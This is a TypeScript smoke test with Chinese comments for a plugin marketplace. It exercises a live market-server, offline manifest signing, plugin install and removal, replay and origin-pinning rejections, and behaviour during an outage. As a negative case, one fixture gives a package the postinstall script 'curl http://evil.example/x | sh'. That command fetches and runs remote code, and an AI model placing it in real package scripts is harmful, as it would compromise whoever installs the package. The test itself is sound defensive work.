/**
 * M5 真机冒烟(live,离线等价,Task 8 Step 3)。
 *
 * 与 market-e2e.spec 的差别:内网源不是 mock,而是**真实 market-server
 * 子进程**(node --experimental-strip-types src/index.ts,env 配置,fail-closed
 * 四必需项),签名用**真实离线工具链**(scripts/gen-signing-key.mjs 产钥 →
 * 管理面 prepare 待签清单 → scripts/sign-manifest.mjs 离线签名 → 管理面
 * intake 激活),pnpm 用**应用自带 binary**(dsh-plugin-huaanwork/node_modules/
 * pnpm/bin/pnpm.mjs,round6 S2 版本基线复现),revision store 用**真实文件实现**
 * (createFileRevisionStore)。
 *
 * 环境门:MARKET_SMOKE_LIVE=1 才运行(默认 skip——门禁不依赖活服务)。
 *
 * 层级诚实标注:
 * - route 层 = 真实 registerMarketRoutes handler 直调(fake ctx.webServer 只负责
 *   记录注册;MarketView UI 不在本环境驱动,UI 为 routes 之上的薄 fetch 层);
 * - 恢复窗口本体为 Electron 主进程面(openStartupRecoveryWindow),本冒烟只锁
 *   wrapper 层「无自动回滚」+ 启动失败路由承接两条可测语义(与 e2e 同口径);
 * - 断网等价性 = `--offline` 机制强制(argv 断言)+ 密封冷 store/cache(安装若
 *   触网必确定性失败)+ wrapper HTTP seam 连接记录(记录每次 fetch 委托的 host,
 *   断言零非 loopback;阳性对照防记录器空转)三证;公网接口在本机未做 pfctl 级
 *   封禁,记录为环境限制。
 */
import { spawn, spawnSync, execFileSync } from 'node:child_process'
import type { IncomingMessage, ServerResponse } from 'node:http'
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, describe, expect, test } from 'vitest'
import type { Context } from '@deepseek-ai/cordis'
import { routeDesktopStartupFailure } from '../../src/startup-failure-routing.ts'
import { removePlugin } from '../../src/huaanwork-host/plugins-host.ts'
import { MARKET_ROUTE_PATHS, registerMarketRoutes } from '../../src/huaanwork-host/market/routes.ts'
import {
  createFileRevisionStore,
  createMarketHttpClient,
  type MarketHttpClient,
  type MarketRevisionStore,
} from '../../src/huaanwork-host/market/catalog-client.ts'
import { downloadAndStageArtifact } from '../../src/huaanwork-host/market/install.ts'
import type { MarketManifestFile } from '../../src/huaanwork-host/market/verify.ts'
import {
  createMarketSandbox,
  disposeAllMarketSandboxes,
  fileReferenceExists,
  type MarketSandbox,
} from './market-pnpm-fixture.ts'

const LIVE = process.env.MARKET_SMOKE_LIVE === '1'
const suite = LIVE ? describe : describe.skip

const REPO_ROOT = resolve(fileURLToPath(new URL('.', import.meta.url)), '../../..')
const MARKET_SERVER_DIR = join(REPO_ROOT, 'market-server')
const BUNDLED_PNPM = join(REPO_ROOT, 'dsh-plugin-huaanwork', 'node_modules', 'pnpm', 'bin', 'pnpm.mjs')
const ADMIN_TOKEN = 'smoke-admin-token'

const cleanup: Array<() => void | Promise<void>> = []
afterEach(async () => {
  while (cleanup.length > 0) await cleanup.pop()!()
  disposeAllMarketSandboxes()
})

// ---------------------------------------------------------------------------
// 真实 market-server 子进程 + 真实离线签名工具链
// ---------------------------------------------------------------------------

interface LiveMarket {
  readonly baseUrl: string
  readonly origin: string
  readonly keysDir: string
  readonly publicKeyHex: string
  stop: () => Promise<void>
}

async function bootLiveMarket(): Promise<LiveMarket> {
  const port = 18_700 + Math.floor(Math.random() * 200)
  const origin = `http://127.0.0.1:${String(port)}`
  const keysDir = mkdtempSync(join(tmpdir(), 'market-smoke-keys-'))
  const dataDir = mkdtempSync(join(tmpdir(), 'market-smoke-data-'))
  // 真实离线 keygen(脚本拒绝在 git worktree 内写盘;tmpdir 在外)。
  execFileSync(process.execPath, [join(MARKET_SERVER_DIR, 'scripts', 'gen-signing-key.mjs'), '--out', keysDir], { stdio: 'pipe' })
  const publicKeyHex = readFileSync(join(keysDir, 'market-signing-key.pub.hex'), 'utf8').trim()
  const child = spawn(process.execPath, ['--experimental-strip-types', 'src/index.ts'], {
    cwd: MARKET_SERVER_DIR,
    env: {
      ...process.env,
      MARKET_SERVER_PORT: String(port),
      MARKET_SERVER_DATA_DIR: dataDir,
      MARKET_SERVER_PUBLIC_ORIGIN: origin,
      MARKET_SERVER_VERIFY_PUBLIC_KEY: join(keysDir, 'market-signing-key.pub.hex'),
      MARKET_SERVER_ADMIN_TOKEN: ADMIN_TOKEN,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let serverLog = ''
  child.stdout.on('data', chunk => { serverLog += String(chunk) })
  child.stderr.on('data', chunk => { serverLog += String(chunk) })
  cleanup.push(async () => {
    child.kill('SIGKILL')
    rmSync(keysDir, { recursive: true, force: true })
    rmSync(dataDir, { recursive: true, force: true })
  })
  // 等 /healthz(最多 15s)。
  const deadline = Date.now() + 15_000
  for (;;) {
    try {
      const res = await fetch(`${origin}/healthz`)
      if (res.ok) break
    } catch { /* not up yet */ }
    if (Date.now() > deadline) throw new Error(`market-server did not boot; log:\n${serverLog}`)
    await new Promise(r => setTimeout(r, 100))
  }
  return {
    baseUrl: origin,
    origin,
    keysDir,
    publicKeyHex,
    stop: async () => { child.kill('SIGKILL') },
  }
}

async function adminJson(market: LiveMarket, method: string, path: string, body?: unknown, rawBody?: Buffer, contentType?: string): Promise<{ status: number; body: any }> {
  const headers: Record<string, string> = { authorization: `Bearer ${ADMIN_TOKEN}` }
  const init: RequestInit = { method, headers }
  if (rawBody !== undefined) {
    headers['content-type'] = contentType ?? 'application/gzip'
    init.body = new Uint8Array(rawBody)
  } else if (body !== undefined) {
    headers['content-type'] = 'application/json'
    init.body = JSON.stringify(body)
  }
  const res = await fetch(`${market.baseUrl}${path}`, init)
  return { status: res.status, body: await res.json().catch(() => null) }
}

/** 真实两步离线签名流:prepare → 下载 pending → 离线工具签名 → intake 激活。 */
async function activateManifest(market: LiveMarket): Promise<{ revision: number }> {
  const prepared = await adminJson(market, 'POST', '/v1/admin/manifest/prepare')
  expect(prepared.status).toBe(200)
  const pending = prepared.body.pendingManifest
  const workDir = mkdtempSync(join(tmpdir(), 'market-smoke-sign-'))
  const manifestPath = join(workDir, 'pending.json')
  writeFileSync(manifestPath, `${JSON.stringify(pending, null, 2)}\n`, { mode: 0o600 })
  execFileSync(process.execPath, [
    '--experimental-strip-types',
    join(MARKET_SERVER_DIR, 'scripts', 'sign-manifest.mjs'),
    '--manifest', manifestPath,
    '--key', join(market.keysDir, 'market-signing-key.pem'),
    '--slot', '1',
  ], { stdio: 'pipe' })
  const record = JSON.parse(readFileSync(`${manifestPath}.sig.json`, 'utf8'))
  const intake = await adminJson(market, 'POST', '/v1/admin/manifest/signature', record)
  expect(intake.status).toBe(200)
  expect(intake.body).toMatchObject({ activated: true })
  rmSync(workDir, { recursive: true, force: true })
  return { revision: intake.body.revision }
}

// ---------------------------------------------------------------------------
// wrapper route 层 harness(与 market-e2e.spec 同构;pnpm = 应用自带 binary)
// ---------------------------------------------------------------------------

/** 应用自带 pnpm(round6 S2):node <app>/node_modules/pnpm/bin/pnpm.mjs + 密封 store/cache。 */
function bundledPnpmVersion(): string {
  const run = spawnSync(process.execPath, [BUNDLED_PNPM, '--version'], { encoding: 'utf8' })
  return (run.stdout || run.stderr || '').trim()
}

interface PnpmStub { pnpm: { runPlugin(argv: readonly string[], invokingDir: string): any }; calls: string[][] }

/** 应用自带 pnpm(round6 S2):node <app>/node_modules/pnpm/bin/pnpm.mjs + 密封 store/cache。 */
function bundledPnpmStub(sandbox: MarketSandbox): PnpmStub {
  const calls: string[][] = []
  return {
    calls,
    pnpm: {
      runPlugin(argv: readonly string[], invokingDir: string) {
        calls.push([...argv])
        const run = spawnSync(process.execPath, [BUNDLED_PNPM, ...argv, '--store-dir', sandbox.storeDir, '--cache-dir', sandbox.cacheDir], {
          cwd: invokingDir,
          encoding: 'utf8',
          env: { ...process.env, CI: 'true' },
          maxBuffer: 16 * 1024 * 1024,
        })
        return {
          stdout: { resume() {} },
          stderr: { resume() {} },
          done: Promise.resolve({ exitCode: run.status ?? -1, signal: null }),
          cancel() {},
        }
      },
    },
  }
}

interface RecordedRoute { kind: string; path: string; handler: (req: IncomingMessage, res: ServerResponse) => void }

/** M4 口径卸载上下文(plugins-host removePlugin;市场卸载复用同链)。 */
function pluginRouteCtx(sandbox: MarketSandbox, stub: PnpmStub, confirmed = true) {
  return {
    profileDir: sandbox.profileDir,
    logger: () => {},
    desktopPnpm: stub.pnpm,
    requestRestart: () => Promise.resolve(confirmed),
  }
}

function registerRoutes(sandbox: MarketSandbox, market: LiveMarket, stub: PnpmStub, opts: { confirmed?: boolean; revisionStore?: MarketRevisionStore } = {}): RecordedRoute[] {
  const recorded: RecordedRoute[] = []
  const fake = {
    webServer: {
      port: 9,
      register(route: RecordedRoute) {
        recorded.push(route)
        return () => {}
      },
    },
    desktopPnpm: stub.pnpm,
    desktopRuntime: { requestConfirmedRestart: async () => opts.confirmed ?? true },
  } as unknown as Context
  registerMarketRoutes(fake, {
    profileDir: sandbox.profileDir,
    origin: market.origin,
    pins: { current: { publicKeyHex: market.publicKeyHex } },
    now: () => Date.now(),
    revisionStore: opts.revisionStore ?? createFileRevisionStore(sandbox.profileDir, () => {}),
    http: recordingHttpClient(),
    logger: () => {},
  })
  return recorded
}

function request(body: unknown, init: { method?: string; origin?: string } = {}): IncomingMessage {
  const raw = body === undefined ? Buffer.alloc(0) : Buffer.from(JSON.stringify(body))
  const method = init.method ?? 'POST'
  const req = {
    method,
    headers: {
      host: '127.0.0.1:9',
      origin: init.origin ?? 'http://127.0.0.1:9',
      ...(raw.byteLength > 0 ? { 'content-length': String(raw.byteLength) } : {}),
    },
    socket: { remoteAddress: '127.0.0.1' },
    async *[Symbol.asyncIterator]() {
      if (raw.byteLength > 0) yield raw
    },
  }
  return req as unknown as IncomingMessage
}

function capture(): { res: ServerResponse; status: () => number; json: () => any } {
  let status = 0
  let raw = ''
  const res = {
    statusCode: 200,
    setHeader() {},
    end(data?: string) {
      status = this.statusCode
      raw = data ?? ''
    },
  }
  return { res: res as unknown as ServerResponse, status: () => status, json: () => JSON.parse(raw) }
}

async function callRoute(recorded: RecordedRoute[], path: string, req: IncomingMessage): Promise<{ status: () => number; json: () => any }> {
  const route = recorded.find(entry => entry.path === path)!
  const out = capture()
  route.handler(req, out.res)
  const deadline = Date.now() + 120_000
  while (out.status() === 0 && Date.now() < deadline) {
    await new Promise(r => setImmediate(r))
  }
  if (out.status() === 0) throw new Error(`route ${path} did not finish`)
  return out
}

// ---------------------------------------------------------------------------
// 连接记录(wrapper HTTP seam:deps.http 注入记录 client,委托真实 client 实现)
// ---------------------------------------------------------------------------
//
// 不补丁 node:http 模块导出——wrapper 经 ESM import 绑定 `get as httpGet`,
// 模块导出补丁(无论 request 还是 get)都拦不到已导入绑定(评审 round 1 实证
// 0 命中)。记录器坐在 wrapper 的 HTTP 注入缝上:record → 委托
// createMarketHttpClient() 的真实 fetchBuffer(node:http 真实 socket)。

const recordedHosts: string[] = []

function recordingHttpClient(): MarketHttpClient {
  const real = createMarketHttpClient()
  return {
    fetchText(url, label) {
      recordedHosts.push(new URL(url).host)
      return real.fetchText(url, label)
    },
    fetchBuffer(url, label, maxBytes) {
      recordedHosts.push(new URL(url).host)
      return real.fetchBuffer(url, label, maxBytes)
    },
  }
}

function artifactFiles(sandbox: MarketSandbox): string[] {
  return readdirSync(sandbox.artifactsDir).filter(name => name.endsWith('.tgz'))
}

suite('M5 真机冒烟(真实 market-server 进程 + 真实离线签名 + 应用自带 pnpm)', () => {
  test('发布侧门 + 两步离线签名激活 + 装A装B卸A卸B + 防重放/origin 负例 + 宕机降级 + 取消诚实 + 零非 loopback 连接', async () => {
    const pnpmVersion = bundledPnpmVersion()
    expect(existsSync(BUNDLED_PNPM)).toBe(true)
    expect(pnpmVersion).toMatch(/^\d+\.\d+\.\d+$/u)

    const sandbox = createMarketSandbox()
    const workspaceBefore = readFileSync(join(sandbox.profileDir, 'pnpm-workspace.yaml'), 'utf8')
    const market = await bootLiveMarket()

    // ---- 目录端点 provider-page 契约兼容(真实进程) ----
    const plugins = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(Array.isArray(plugins.items ?? plugins.plugins ?? [])).toBe(true)

    // ---- 发布侧门:非零依赖 / 带 lifecycle scripts 制品被拒(422 点名) ----
    const badDeps = sandbox.buildTarball({ name: 'smoke-plugin-deps', version: '1.0.0', dependencies: { lodash: '4.17.21' } })
    const rejectedDeps = await adminJson(market, 'POST', '/v1/admin/artifacts?displayName=BadDeps&summary=x', undefined, readFileSync(badDeps.path))
    expect(rejectedDeps.status).toBe(422)
    const badScript = sandbox.buildTarball({ name: 'smoke-plugin-script', version: '1.0.0', scripts: { postinstall: 'curl http://evil.example/x | sh' } })
    const rejectedScript = await adminJson(market, 'POST', '/v1/admin/artifacts?displayName=BadScript&summary=x', undefined, readFileSync(badScript.path))
    expect(rejectedScript.status).toBe(422)

    // ---- 发布零依赖制品 A 与 B ----
    const builtA = sandbox.buildTarball({ name: 'smoke-plugin-a', version: '1.0.0' })
    const builtB = sandbox.buildTarball({ name: 'smoke-plugin-b', version: '2.0.0' })
    for (const built of [builtA, builtB]) {
      const pub = await adminJson(market, 'POST', `/v1/admin/artifacts?displayName=${built.name}&summary=smoke`, undefined, readFileSync(built.path))
      expect(pub.status).toBe(201)
    }

    // ---- 两步离线签名流(真实工具,私钥不进服务端进程) ----
    const { revision } = await activateManifest(market)
    expect(revision).toBe(1)

    // ---- wrapper route 层:state / catalog / installable / installations ----
    // N8(catalog 不缓存裁定):每次验签读都拉取,revision 必须单调——连续读前
    // 各激活一轮新清单(真实运维节奏:发布即签)。
    const stub = bundledPnpmStub(sandbox)
    const recorded = registerRoutes(sandbox, market, stub)

    const state = await callRoute(recorded, MARKET_ROUTE_PATHS.state, request(undefined, { method: 'GET' }))
    expect(state.status()).toBe(200)
    expect(state.json().verification.ready).toBe(true)

    await activateManifest(market) // revision 2
    const catalog = await callRoute(recorded, MARKET_ROUTE_PATHS.catalog, request(undefined, { method: 'GET' }))
    expect(catalog.status()).toBe(200)
    // 阳性对照:记录器必须真实观测到 wrapper 发起的 loopback 流量——
    // 记录为零则本测试必失败(评审 round 1:防记录器空转)。
    expect(recordedHosts.length).toBeGreaterThan(0)
    expect(recordedHosts.every(host => host.startsWith('127.0.0.1'))).toBe(true)
    await activateManifest(market) // revision 3
    const installable = await callRoute(recorded, MARKET_ROUTE_PATHS.installable, request(undefined, { method: 'GET' }))
    expect(installable.status()).toBe(200)
    expect(installable.json().items).toHaveLength(2)
    const installations = await callRoute(recorded, MARKET_ROUTE_PATHS.installations, request(undefined, { method: 'GET' }))
    expect(installations.status()).toBe(200)

    // ---- 四步:装 A → 装 B → 卸 A → 卸 B(N1 回归门,file: 全程在盘) ----
    const deps = () => sandbox.readProfileDependencies()

    await activateManifest(market) // revision 4
    const execA = await callRoute(recorded, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-plugin-a', version: '1.0.0' }))
    expect(execA.status()).toBe(200)
    expect(Object.keys(deps())).toHaveLength(1)
    expect(fileReferenceExists(sandbox.profileDir, deps())).toBe(true)
    expect(artifactFiles(sandbox)).toHaveLength(1) // 装后不删

    await activateManifest(market) // revision 5
    const execB = await callRoute(recorded, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-plugin-b', version: '2.0.0' }))
    expect(execB.status()).toBe(200)
    expect(Object.keys(deps())).toHaveLength(2)
    expect(fileReferenceExists(sandbox.profileDir, deps())).toBe(true)
    expect(artifactFiles(sandbox)).toHaveLength(2)

    const removeA = await removePlugin(pluginRouteCtx(sandbox, stub), 'smoke-plugin-a')
    expect(removeA.restarting).toBe(true)
    expect(Object.keys(deps())).toHaveLength(1)
    expect(deps()['smoke-plugin-a']).toBeUndefined()
    expect(fileReferenceExists(sandbox.profileDir, deps())).toBe(true)
    expect(artifactFiles(sandbox)).toHaveLength(1) // GC:无 file: 引用才删

    const removeB = await removePlugin(pluginRouteCtx(sandbox, stub), 'smoke-plugin-b')
    expect(removeB.restarting).toBe(true)
    expect(Object.keys(deps())).toHaveLength(0)
    expect(artifactFiles(sandbox)).toHaveLength(0)

    // ---- argv 证据:market install 恒带双 flag、无 --registry;remove 无 flag(N2) ----
    const addCalls = stub.calls.filter(argv => argv[0] === 'add')
    expect(addCalls.length).toBeGreaterThanOrEqual(2)
    for (const argv of addCalls) {
      expect(argv).toContain('--offline')
      expect(argv).toContain('--ignore-scripts')
      expect(argv.join(' ')).not.toContain('--registry')
    }
    const removeCalls = stub.calls.filter(argv => argv[0] === 'remove')
    expect(removeCalls.length).toBeGreaterThanOrEqual(2)
    for (const argv of removeCalls) {
      expect(argv).not.toContain('--offline')
      expect(argv).not.toContain('--ignore-scripts')
    }

    // ---- 全程无批准键写入(N3 机械面) ----
    expect(readFileSync(join(sandbox.profileDir, 'pnpm-workspace.yaml'), 'utf8')).toBe(workspaceBefore)

    // ---- 防重放负例:持久 revision 已前进,旧清单(同 revision)重放必拒 ----
    const { revision: activeRevision } = await activateManifest(market)
    const seeded: MarketRevisionStore = {
      loadMaxRevision: () => activeRevision,
      saveMaxRevision: () => {},
    }
    const replayRoutes = registerRoutes(sandbox, market, stub, { revisionStore: seeded })
    const replay = await callRoute(replayRoutes, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-plugin-a', version: '1.0.0' }))
    expect(replay.status()).toBe(502)
    expect(replay.json().error.code).toBe('market-verification-failed')

    // ---- origin 钉扎负例(X1):跨源 tarball URL 在下载入口即拒,零请求 ----
    const recordedBeforeX1 = recordedHosts.length
    await expect(downloadAndStageArtifact({
      origin: market.origin,
      file: { name: 'smoke-plugin-a', version: '1.0.0', sha256: builtA.sha256, tarballPath: 'http://evil.intranet.example/artifacts/smoke-plugin-a-1.0.0.tgz', size: 1 } as MarketManifestFile,
      profileDir: sandbox.profileDir,
      http: recordingHttpClient(),
    })).rejects.toThrow(/origin|同源|same-origin/iu)
    expect(recordedHosts.length).toBe(recordedBeforeX1)

    // ---- 取消诚实(§14 第 33 条):取消重启,message 告知已写入清单 ----
    const cancelStub = bundledPnpmStub(sandbox)
    const cancelRoutes = registerRoutes(sandbox, market, cancelStub, { confirmed: false })
    await activateManifest(market) // execute 前revision 单调(N8)
    const cancelInstall = await callRoute(cancelRoutes, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-plugin-a', version: '1.0.0' }))
    expect(cancelInstall.status()).toBe(200)
    expect(cancelInstall.json().restarting).toBeUndefined() // 取消 ⇒ 键缺省(M4 口径)
    expect(cancelInstall.json().message).toMatch(/已取消重启/u)
    expect(deps()['smoke-plugin-a']).toBeDefined() // 取消不回滚清单
    await removePlugin(pluginRouteCtx(sandbox, cancelStub), 'smoke-plugin-a')

    // ---- 装坏包恢复窗口(wrapper 层):无自动回滚 + 启动失败路由承接 ----
    expect(routeDesktopStartupFailure({ appReady: true, stage: 'runtime-bootstrap' })).toBe('startup-recovery')

    // ---- 内网宕机降级:state 仍诚实可读(本地 tab 旁路依据),catalog 诚实 502 ----
    await market.stop()
    const downState = await callRoute(recorded, MARKET_ROUTE_PATHS.state, request(undefined, { method: 'GET' }))
    expect(downState.status()).toBe(200)
    expect(downState.json().origin).toBe(market.origin)
    const downCatalog = await callRoute(recorded, MARKET_ROUTE_PATHS.catalog, request(undefined, { method: 'GET' }))
    expect(downCatalog.status()).toBe(502)
    expect(downCatalog.json().error.code).toBe('market-unreachable')

    // ---- 零非 loopback 连接实证(wrapper HTTP seam 记录:每次委托前记录 host) ----
    const nonLoopback = recordedHosts.filter(host => !host.startsWith('127.0.0.1'))
    expect(nonLoopback).toEqual([])
  }, 240_000)
})
